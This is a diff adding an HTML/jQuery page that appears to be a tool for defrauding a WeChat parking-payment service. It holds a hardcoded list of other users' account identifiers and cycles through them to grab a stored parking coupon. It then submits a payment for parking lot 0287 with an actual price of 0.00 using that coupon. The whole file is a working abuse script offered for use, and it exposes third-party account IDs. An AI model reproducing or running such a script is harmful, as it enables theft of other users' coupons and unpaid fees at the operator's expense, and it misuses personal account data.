@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html>    
+    <head>
+        <title> </title>
+        <meta charset="UTF-8" />
+		<meta http-equiv="Access-Control-Allow-Origin" content="*" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="apple-touch-icon" sizes="114x114" href="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2039653471,1551787164&amp;fm=15&amp;gp=0.jpg" />
+        <link rel="stylesheet" href="https://apps.bdimg.com/libs/jquerymobile/1.4.5/jquery.mobile-1.4.5.min.css" />
+        <script src="https://apps.bdimg.com/libs/jquery/1.10.2/jquery.min.js"></script>
+        <script src="https://apps.bdimg.com/libs/jquerymobile/1.4.5/jquery.mobile-1.4.5.min.js"></script>
+        <script>
+			function decodeUnicode(str) {
+                str = str.replace(/\\/g, "%");
+                str = unescape(str);
+                str = str.replace(/%/g, "\\");
+                str = str.replace(/\\/g, "");
+                return str;
+            }
+            ids = [{
+                telNo: "11998219",
+                openId: "oiELbvqriIWqlGnMZ05X9yMGP2gU",
+                thirdOpenId: "o0k-ojuz400nOP4AI09qW5rr6GTM"
+            },
+            {
+                telNo: "11992295",
+                openId: "oiELbvjLCvsB9Xx346eA1xEYvZN4",
+                thirdOpenId: "o0k-ojirK-zknVSUd2W4jWnInezI"
+            },
+            {
+                telNo: "11990561",
+                openId: "oiELbvtoGTlmjF593aSg7ObM9zZ8",
+                thirdOpenId: "o0k-ojgBQqhOUPYquitPzs_QmQzg"
+            },
+            {
+                telNo: "11880774",
+                openId: "oiELbvs_N58si7PX67WzBSmS9vEE",
+                thirdOpenId: "o0k-ojqh0xXgx7_Bgo4MF2Nwi51Q"
+            },
+            {
+                telNo: "11996770",
+                openId: "oiELbviN6jUj_ukWSTO6X9a3lft4",
+                thirdOpenId: "o0k-oji-_nG3CfMgZT4FUdYqugMU"
+            },
+            {
+                telNo: "11887714",
+                openId: "oiELbvgkmFap9UpSy9buWZ9ZrVmE",
+                thirdOpenId: "o0k-ojtZBGNrFm_2oHIfBcEc9HWs"
+            },
+            {
+                telNo: "11996531",
+                openId: "oiELbvnEYW1Q9Bl3UTW6oUctO2kU",
+                thirdOpenId: "o0k-ojr6bXqfus4qsuAWRslmy1QU"
+            },
+            {
+                telNo: "11994474",
+                openId: "oiELbvl308ZqV0S9nm1gdjihocdo",
+                thirdOpenId: "o0k-ojjpmdk3g81hLW50AhIQ99n8"
+            },
+            {
+                telNo: "11991747",
+                openId: "oiELbvgop8EnSBf05GPOcgMMueTo",
+                thirdOpenId: "o0k-ojn5HYhCDWrkOIVyt4pSjwfY"
+            },
+            {
+                telNo: "11993631",
+                openId: "oiELbvqxelaTfrQpIRZKY1smHbNE",
+                thirdOpenId: "o0k-ojhzxYAEaPc3NR8p43ysIP_8"
+            },                                             
+            {                                              
+                telNo: "11998131",                             
+                openId: "oiELbvjBtMx8kIp7e0hWjHUubZIQ",
+                thirdOpenId: "o0k-ojluH0mP072E3NdlsPNxxlnE"                                                                                                          
+            },                                             
+            {                                              
+                telNo: "11992435",                         
+                openId: "oiELbvuwn2Ulqpfd4ukD69w89TZk",    
+                thirdOpenId: "o0k-ojju0calLT_9myMAJ5cBRQ-k"
+            },
+            {
+                telNo: "2191",
+                openId: "oiELbvhfPwEsSvKzYHAu90EMpRZQ",    
+                thirdOpenId: "o0k-ojqfHgz5UByQU3CbxW7CwkQ4"
+            },                                                                                                                                                       
+            {                                                                                                                                                        
+                telNo: "7152",                                                                                                                                       
+                openId: "oiELbvucD32WG6uhmhC65v-YSPbY",                                                                                                              
+                thirdOpenId: "o0k-ojhpOzI6wvE7wBfAN6kdAwuQ"                                                                                                          
+            },                                                                                                                                                       
+            {                                                                                                                                                        
+                telNo: "2210",                                                                                                                                       
+                openId: "oiELbvieZkXGOHoeApz2blO50d4I",                                                            
+                thirdOpenId: "o0k-ojm2hpraGSPnEaqr_KbAz2Uo"                                              
+            },                                             
+            {                                              
+                telNo: "663",                              
+                openId: "oiELbvjFfGWmnjWV8954mVyyLjxE",    
+                thirdOpenId: "o0k-ojil811uJtCq6SA_XzNVWx_8"
+            },                                             
+            {                                              
+                telNo: "C23",                                           
+                openId: "oiELbvu6L6DlUQDno25d44j5Rjo0",                 
+                thirdOpenId: "o0k-ojs1cU7wyhj77VKGouimkApc"             
+            }
+            ];
+            function update() {
+                $.post("http://ad.subinwechat.com/user/update_ticket", {
+                    appid: appid,
+                    openId: openId,
+                    ticket: $("#ticket").val()
+                },
+                function(data, status) {
+                    resj = JSON.parse(data);
+                    if (resj.code == 0) {
+                        $("#result").html(decodeUnicode(data) + "<hr>" + $("#result").html());
+                    } else {
+                        seq = resj.Seq;
+                        time = resj.Time;
+                        entry = resj.Entry;
+                        ticket = resj.Ticket;
+                        quitTime = resj.QuitTime;
+						$("#result").html("Seq:" + seq + "<br>Ticket:" + ticket + "<br>Time:" + time + "<br>Entry:" + entry + "<br>QuitTime:" + quitTime + "<hr>" + $("#result").html());
+                    }
+                });
+            };
+            function confirm() {
+                $.post("https://ad.subinwechat.com/wechat/wechatPay", {
+                    Seq: seq,
+                    Time: time,
+                    Entry: entry,
+                    appid: appid,
+                    openId: openId,
+                    Ticket: ticket,
+                    QuitTime: quitTime,
+                    thirdOpenId: thirdOpenId,
+                    chooseCouponId: chooseCouponId,
+                    lpn: "",
+                    payway: 0,
+                    pDiscount: 0,
+                    PaymentNr: 1,
+                    ParkArea: "",
+                    Price: "8.00",
+                    parkId: "0287",
+                    Discount: "0.00",
+                    nickName: "AUTO",
+                    server_type: "VBM",
+                    ActualPrice: "0.00"
+                },
+                function(data, status) {
+                    resj = JSON.parse(data);
+                    $("#result").html(decodeUnicode(data) + "<hr>" + $("#result").html());
+                });
+            };
+            function getCoupon() {
+                for (i = 0; i < ids.length; i++) {
+                    openId = ids[i].openId;
+                    thirdOpenId = ids[i].thirdOpenId;
+                    telNo = ids[i].telNo;
+                    $.post("http://ad.subinwechat.com/user/get_user_coupon_use", {
+                        openId: openId,
+                        thirdOpenId: thirdOpenId,
+                        nr: 1,
+                        lpn: "",
+                        payway: 0,
+                        ticket: "",
+                        Price: 8.00,
+                        discount: 0.00,
+                        parkId: "0287",
+                        restrictType: 0
+                    },
+                    function(data, status) {
+                        resj = JSON.parse(data);
+                        if (resj.coupon_list && resj.coupon_list.length > 0) {
+                            chooseCouponId = resj.coupon_list[0].coupon_id;
+                            couponValidity = resj.coupon_list[0].coupon_validity;
+                            $("#result").html(tryId + ": " + telNo + ": " + couponValidity + "<br>" + chooseCouponId + "<hr>" + $("#result").html());
+                            $("#coupon").html(chooseCouponId);
+                            hasCoupon = true;
+                        } else {
+                            $("#coupon").html("");
+                            $("#result").html(tryId + ": " + data + "    " + telNo + "<hr>" + $("#result").html());
+                            hasCoupon = false;
+                            ids.shift();
+                            tryId = tryId + 1;
+                            getCoupon();
+                        }
+                    });
+                    //if (hasCoupon)
+                    break;
+                }
+            }
+            $(document).on("pageinit",
+            function() {
+				$("input[type='checkbox']").attr("checked",true).checkboxradio("refresh");
+            });
+            var tryId = 1;
+            var hasCoupon = false;
+
+            var seq;
+            var time;
+            var entry;
+            var ticket;
+            var openId;
+            var quitTime;
+            var nickName;
+            var thirdOpenId;
+            var chooseCouponId;
+            var appid = "wxd396e26e8729f0d1";
+		</script>
+    </head>
+    
+    <body>
+        <div data-role="page" id="pageone">
+            <div data-role="header" style="display:none">
+                <h1></h1></div>
+            <div data-role="main" class="ui-content">
+                <div class="ui-field-contain">
+					<input type="button" value="PUNCH ALL">
+				    <fieldset data-role="controlgroup" style="display:none">
+						<input type="button" value="LY" data-mini="true">
+						<input type="button" value="LXWC" data-mini="true">
+						<input type="button" value="DANING" data-mini="true">
+						<input type="button" value="DINGDONG" data-mini="true">
+						<input type="button" value="WUYOUXING" data-mini="true">
+						<input type="button" value="XINDONGFANG" data-mini="true">
+						<input type="button" value="XINDONGFANGDH" data-mini="true">
+				    </fieldset>
+					<br>
+					<fieldset data-role="controlgroup">
+						<input type="text" name="ticket" id="ticket" placeholder="1141.0325.0287" value=""/>
+				        <input type="radio" name="radio-choice-v-6" id="radio-choice-v-6a" value="on" checked="checked" data-mini="true" style="display:none">
+				        <label for="radio-choice-v-6a" id="coupon" style="font-size:12px">&nbsp;</label>
+					</fieldset>
+                </div>
+            <div data-role="footer">
+                <h1>
+                    <input type="button" onclick="getCoupon()" data-inline="true" value="GET" />
+                    <input type="button" onclick="update()" data-inline="true" value="CHECK" />
+                    <input type="button" onclick="confirm()" data-inline="true" value="CONFIRM" /></h1>
+            </div>
+            <div id="result" style="font-size:12.5px"></div>
+        </div>
+    </body>
+</html>
